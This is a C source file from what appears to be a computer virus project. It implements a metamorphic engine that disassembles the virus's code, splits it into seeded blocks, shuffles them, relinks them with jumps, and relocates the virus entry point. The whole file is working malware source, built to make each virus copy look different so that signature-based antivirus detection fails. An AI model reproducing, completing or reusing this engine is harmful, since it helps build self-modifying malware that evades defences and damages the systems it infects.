
#include "blocks.h"
#include "errors.h"
#include "compiler_utils.h"

#include "utils.h"
#include "visual.h"
#include "disasm.h"

#include "write_jump.h"

/*
** permutate_blocks
** - permutates the code given by instructions blocks of arbitrary size
** - the blocks are permutated deterministically according to the seed
** - when needed the blocks are linked together with jumps
** - when possible jumps are eliminated by using them as separator when
**   splitting blocks
**
*/

static size_t	safe_shift(size_t offset, int32_t shift_amount)
{
	return (size_t)((ssize_t)offset + (ssize_t)shift_amount);
}

/* ------------------------------ Shard blocks ------------------------------ */

bool		is_abs_jump(void *addr)
{
	return (*(uint8_t*)addr == 0xe9);
}

bool		want_to_cut_clean(size_t block_length, size_t delta,
			uint64_t *seed)
{
	size_t		closeness = (block_length * 100) / delta;
	uint64_t	rand      = random_inrange(seed, 0, 100);

	// return (closeness > rand);
	return false;
}

static bool	split_ref(struct safe_ptr *ref_origin,
			struct safe_ptr *ref_half,
			uint64_t *seed, bool *cut_clean)
{
	size_t	delta        = ref_origin->size / 2;
	size_t	block_length = 0;

	while (block_length < delta)
	{
		size_t	instruction = disasm_length(ref_origin->ptr + block_length, ref_origin->size - block_length);

		if (!instruction) return errors(ERR_VIRUS, _ERR_CANT_SPLIT_MORE);

		block_length += instruction;

		if (is_abs_jump(ref_origin->ptr + block_length - instruction)
		&& want_to_cut_clean(block_length, delta, seed))
		{
			*cut_clean = true;
			break ;
		}
	}

	ref_half->ptr = ref_origin->ptr + block_length;
	ref_half->size = ref_origin->size - block_length;
	ref_origin->size = block_length;

	return true;
}

static void	split_jumps(struct code_block *origin, struct code_block *half)
{
	const struct jump	*jumps = origin->jumps;
	const void		*half_location = half->ref.ptr;
	size_t			i = 0;

	while (jumps[i].location < half_location && jumps[i].location)
		i++;

	half->jumps = origin->jumps + i;
	half->njumps = origin->njumps - i;
	origin->njumps = i;
}

static void	split_labels(struct code_block *origin, struct code_block *half)
{
	const struct label	*labels = origin->labels;
	const void		*half_location = half->ref.ptr;
	size_t			i = 0;

	while (labels[i].location < half_location && labels[i].location)
		i++;

	half->labels = origin->labels + i;
	half->nlabels = origin->nlabels - i;
	origin->nlabels = i;
}

static bool	split_block(struct code_block *origin, struct code_block *half,
			uint64_t *seed)
{
	bool	cut_clean = false;

	if (!split_ref(&origin->ref, &half->ref, seed, &cut_clean))
		return errors(ERR_THROW, _ERR_SPLIT_BLOCK);

	split_jumps(origin, half);
	split_labels(origin, half);

	half->trailing_block  = origin->trailing_block;
	origin->trailing_block = cut_clean ? NULL : half;

	return true;
}

/*
** recursive_split_blocks:
**    stores blocks structs in an array according to their order in memory
**    by calculating their half's position in the array
**    according to the number of remaining recusive splits
**
**	3
**	[0][ ][ ][ ][1][ ][ ][ ]
**
**	2           2
**	[0][ ][2][ ][1][ ][3][ ]
**
**	1     1     1     1
**	[0][4][2][5][1][6][3][7]
*/
static bool	recursive_split_blocks(struct code_block *blocks, int split,
			uint64_t *seed)
{
	if (split == 0) return true;

	int	half = POW2(split) / 2;

	if (!split_block(&blocks[0], &blocks[half], seed))
		return errors(ERR_THROW, _ERR_RECURSIVE_SPLIT_BLOCKS);

	if (!recursive_split_blocks(&blocks[0], split - 1, seed)
	|| !recursive_split_blocks(&blocks[half], split - 1, seed))
		return errors(ERR_THROW, _ERR_RECURSIVE_SPLIT_BLOCKS);

	return true;
}

static bool	shard_block(struct code_block *blocks[NBLOCKS], \
			struct code_block *blocks_mem, uint64_t *seed)
{
	if (!recursive_split_blocks(blocks_mem, NDIVISIONS, seed))
		return errors(ERR_THROW, _ERR_SHARD_BLOCK);

	for (size_t i = 0; i < NBLOCKS; i++)
	{
		blocks[i] = &blocks_mem[i];
	}
	return true;
}

/* ----------------------------- Shuffle blocks ----------------------------- */

static bool     want_to_permutate(uint64_t *seed)
{
	return random(seed) % 2;
}

/*
** swap_blocks
**  - a and b MUST be neighbors
**  - a MUST be above b in memory
**   | A | 0x0012
**   |---|
**   | B | 0x0043
*/
static void	swap_blocks(struct code_block **a, struct code_block **b)
{
	struct code_block	*tmp;

	(*a)->shift_amount += (*b)->ref.size;
	(*b)->shift_amount -= (*a)->ref.size;

	tmp = *a;
	*a = *b;
	*b = tmp;
}

static bool	shuffle_blocks(struct code_block *blocks[NBLOCKS], uint64_t seed)
{
	for (size_t pass = 0; pass < NSHUFFLE; pass++)
	{
		for (size_t i = 0; i < NBLOCKS - 1; i++)
		{
			if (want_to_permutate(&seed))
				swap_blocks(&blocks[i], &blocks[i+1]);
		}
	}
	return true;
}

/* ------------------------------ Shift blocks ------------------------------ */
/*
** shift_blocks
** - shifts jumps back to original destination (negative block shift amount)
** - shifts labels with their blocks
*/
static void	shift_jumps(struct jump *jumps, size_t njumps, int shift_amount)
{
	for (size_t i = 0; i < njumps; i++)
	{
		jumps[i].value_shift -= shift_amount;
	}
}

static void	shift_labels(struct label *labels, size_t nlabels, int shift_amount)
{
	for (size_t i = 0; i < nlabels; i++)
	{
		for (size_t j = 0; j < labels[i].njumps; j++)
		{
			labels[i].jumps[j]->value_shift += shift_amount;
		}
	}
}

static bool	shift_blocks(struct code_block *blocks[NBLOCKS])
{
	int	trailing_jumps_additionnal_shift = 0;

	for (size_t i = 0; i < NBLOCKS; i++)
	{
		struct code_block	*b = blocks[i];

		b->shift_amount += trailing_jumps_additionnal_shift;

		shift_jumps(b->jumps, b->njumps, b->shift_amount);
		shift_labels(b->labels, b->nlabels, b->shift_amount);

		if (b->trailing_block)
			trailing_jumps_additionnal_shift += JUMP32_INST_SIZE;
	}
	return true;
}

/* --------------------------- Shift entry point ---------------------------- */

static bool	shift_entry_point(void *input_virus_address, \
			int32_t *virus_func_shift,
			struct code_block *blocks[NBLOCKS])
{
	for (size_t i = 0 ; i < NBLOCKS; i++)
	{
		struct code_block	*b = blocks[i];
		void	*block_start = b->ref.ptr;
		void	*block_end   = b->ref.ptr + b->ref.size;

		if (input_virus_address >= block_start && input_virus_address < block_end)
		{
			*virus_func_shift = b->shift_amount;
			return true;
		}
	}
	return errors(ERR_VIRUS, _ERR_NO_ENTRY_POINT);
}

/* ------------------------- Write permutated code -------------------------- */

static bool	adjust_jumps(struct safe_ptr output_buffer, \
			void *block_buffer, struct code_block *b)
{
	for (size_t i = 0; i < b->njumps; i++)
	{
		struct jump	*j = &b->jumps[i];
		size_t	jump_value_addr = (size_t)j->value_addr;
		int32_t	jump_value      = j->value + j->value_shift;
		uint8_t	jump_size       = j->value_size;

		size_t	block_start  = (size_t)b->ref.ptr;
		size_t	output_start = (size_t)output_buffer.ptr;

		size_t	block_offset = (size_t)block_buffer - output_start;
		size_t	jump_value_offset = jump_value_addr - block_start;

		void	*jump_buffer = safe(output_buffer, block_offset + \
					jump_value_offset, jump_size);

		if (!jump_buffer)
			return errors(ERR_VIRUS, _ERR_ADJUST_JUMPS);

		write_jump(jump_buffer, jump_value, jump_size);
	}
	return true;
}

/*
**     trailing_jump     trailing_block
**   ________ v               v _______
**  |        |[]              |        |
**   --------  |              ^ -------
**             |______________|
**             ^
**       jump_inst_end
*/
static bool	add_trailing_jump(struct safe_ptr output_buffer, \
			void *block_buffer, void *input_start, \
			struct code_block *b, size_t *output_size)
{
	struct code_block	*tb = b->trailing_block;

	if (tb == NULL) goto end;

	size_t	output_start = (size_t)output_buffer.ptr;
	size_t	block_offset = (size_t)block_buffer - output_start;
	size_t	tj_offset    = block_offset + b->ref.size;
	void	*tj_buffer   = safe(output_buffer, tj_offset, JUMP32_INST_SIZE);
	void	*tj_end      = tj_buffer + JUMP32_INST_SIZE;

	if (!tj_buffer)
		return errors(ERR_VIRUS, _ERR_ADD_TRAILING_JUMP);

	size_t	tb_offset = (size_t)tb->ref.ptr - (size_t)input_start;
	size_t	safe_tb_offset = safe_shift(tb_offset, tb->shift_amount);
	size_t	tb_size   = tb->ref.size;
	void	*tb_start = safe(output_buffer, safe_tb_offset, tb_size);

	if (!tb_start)
		return errors(ERR_VIRUS, _ERR_ADD_TRAILING_JUMP);

	int32_t	rel_jump = (size_t)tb_start - (size_t)tj_end;

	if (tj_end + rel_jump != tb_start)
		return errors(ERR_VIRUS, _ERR_BAD_TRAILING_JUMP);

	write_trailing_jump(tj_buffer, rel_jump);
	*output_size += JUMP32_INST_SIZE;
end:
	return true;
}

static bool	write_permutated_code(struct safe_ptr input_code, \
			struct safe_ptr output_buffer, \
			struct code_block *blocks[NBLOCKS],
			size_t *output_size)
{
	size_t		input_start = (size_t)input_code.ptr;

	for (size_t i = 0 ; i < NBLOCKS; i++)
	{
		struct code_block	*b = blocks[i];

		size_t	block_start = (size_t)b->ref.ptr;
		size_t	block_size = b->ref.size;
		size_t	block_offset = block_start - input_start;
		int32_t	shift_amount = b->shift_amount;
		size_t	safe_block_offset = safe_shift(block_offset, shift_amount);

		if (!safe(input_code, block_offset, block_size))
			return errors(ERR_VIRUS, _ERR_WRITE_PERMUTATED_CODE);

		void	*block_buffer = safe(output_buffer, safe_block_offset, block_size);

		if (!block_buffer)
			return errors(ERR_VIRUS, _ERR_WRITE_PERMUTATED_CODE);

		memcpy(block_buffer, (void*)block_start, block_size);
		if (!adjust_jumps(output_buffer, block_buffer, b)
		|| !add_trailing_jump(output_buffer, block_buffer, (void*)input_start, b, output_size))
			return errors(ERR_THROW, _ERR_WRITE_PERMUTATED_CODE);
	}
	return true;
}

/* ---------------------------- Permutate blocks ---------------------------- */
/*
** permutate_blocks
** - input_code: safe ptr to original code
** - output_buffer: safe ptr to buffer where permutated code is written
** - output_size: ptr where code size is returned
** - seed: seed used for random
*/
bool		permutate_blocks(struct safe_ptr input_code, \
			struct safe_ptr output_buffer, \
			size_t *output_size,
			void *input_virus_address, int32_t *virus_func_shift, \
			uint64_t seed)
{
	struct block_allocation		block_memory;
	struct code_block		*blocks[NBLOCKS];

	if (!disasm_block(&block_memory, input_code.ptr, input_code.size) // TODO pass safe pointer, rewrite func
	|| !shard_block(blocks, block_memory.blocks, &seed)
	|| !shuffle_blocks(blocks, seed)
	|| !shift_blocks(blocks)
	|| !shift_entry_point(input_virus_address, virus_func_shift, blocks)
	|| !write_permutated_code(input_code, output_buffer, blocks, output_size))
		return errors(ERR_THROW, _ERR_PERMUTATE_BLOCKS);
#ifdef DEBUG
	print_split_blocks(block_memory.blocks, NBLOCKS, input_code, output_buffer);
	print_general(input_code, output_buffer, (size_t)input_virus_address, *virus_func_shift, *output_size, seed);
#endif
	return true;
}
